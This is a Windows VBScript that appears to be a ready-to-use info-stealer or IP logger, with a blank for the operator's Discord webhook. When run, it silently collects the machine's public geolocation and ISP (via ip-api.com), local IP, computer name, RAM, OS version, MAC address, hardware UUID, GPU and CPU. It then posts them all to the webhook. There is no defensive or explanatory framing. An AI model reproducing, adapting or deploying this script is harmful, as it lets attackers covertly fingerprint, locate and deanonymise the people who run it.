' Set up variables
Dim xhr, ipInfoUrl, ipInfo, city, region, country, isp, postData, webhookUrl, ip, objShell, objExec, objStdOut
Dim pcName, ram, os, mac, hwid, gpu, cpu

' Set the Discord webhook URL
webhookUrl = "ENTER YOUR WEBHOOK URL HERE"

' Set the IP Info API URL
ipInfoUrl = "http://ip-api.com/xml/"

' Get the IP Info for the current machine
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", ipInfoUrl, False
xhr.Send
Set ipInfo = xhr.responseXML

' Get the relevant IP Info data
city = ipInfo.getElementsByTagName("city")(0).Text
region = ipInfo.getElementsByTagName("region")(0).Text
country = ipInfo.getElementsByTagName("country")(0).Text
isp = ipInfo.getElementsByTagName("isp")(0).Text

' Get the IP address of the current machine
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("ipconfig /all")
Set objStdOut = objExec.StdOut

Do Until objStdOut.AtEndOfStream
    strLine = objStdOut.ReadLine()
    If InStr(strLine, "IPv4 Address") Then
        ip = Trim(Split(strLine, ":")(1))
        Exit Do
    End If
Loop

' Get the PC info
pcName = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%COMPUTERNAME%")
ram = FormatNumber(GetObject("winmgmts:").ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem").ItemIndex(0).TotalPhysicalMemory / 1024 / 1024 / 1024, 2) & " GB"
os = CreateObject("WScript.Shell").RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName") & " " & CreateObject("WScript.Shell").RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CurrentBuildNumber")
Set colAdapters = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
For Each objAdapter In colAdapters
    If Not IsNull(objAdapter.MACAddress) Then
        mac = objAdapter.MACAddress
        Exit For
    End If
Next
Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct", "WQL", 48)
For Each objItem In colItems
    hwid = objItem.UUID
Next
Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_VideoController", "WQL", 48)
For Each objItem In colItems
    gpu = objItem.Name
Next
Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Processor", "WQL", 48)
For Each objItem In colItems
    cpu = objItem.Name
Next

' Set up the post data for the Discord webhook
postData = "{""embeds"":[{""title"":""PC Info"",""color"":14177041,""fields"":["
postData = postData & "{""name"":""PC Name"",""value"":""" & pcName & """,""inline"":true},"
postData = postData & "{""name"":""RAM"",""value"":""" & ram & """,""inline"":true},"
postData = postData & "{""name"":""OS"",""value"":""" & os & """,""inline"":true},"
postData = postData & "{""name"":""MAC Address"",""value"":""" & mac & """,""inline"":true},"
postData = postData & "{""name"":""HWID"",""value"":""" & hwid & """,""inline"":true},"
postData = postData & "{""name"":""GPU"",""value"":""" & gpu & """,""inline"":true},"
postData = postData & "{""name"":""CPU"",""value"":""" & cpu & """,""inline"":true},"
postData = postData & "{""name"":""IP Address"",""value"":""" & ip & """,""inline"":true},"
postData = postData & "{""name"":""Location"",""value"":""" & city & ", " & region & ", " & country & """,""inline"":false},"
postData = postData & "{""name"":""ISP"",""value"":""" & isp & """,""inline"":false}"
postData = postData & "]}]}"

' Send the POST request to the Discord webhook
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "POST", webhookUrl, False
xhr.setRequestHeader "Content-Type", "application/json"
xhr.Send postData
